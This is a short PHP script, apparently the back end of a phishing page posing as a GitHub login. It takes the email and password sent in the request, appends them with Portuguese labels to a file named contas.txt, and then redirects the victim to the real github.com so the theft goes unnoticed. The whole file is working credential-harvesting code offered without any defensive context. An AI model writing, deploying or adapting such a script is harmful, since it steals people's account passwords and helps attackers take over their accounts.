<?php

file_put_contents("contas.txt", "Email: " . $_GET['login'] . "\n" . " Senha: " . $_GET['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/');
exit();
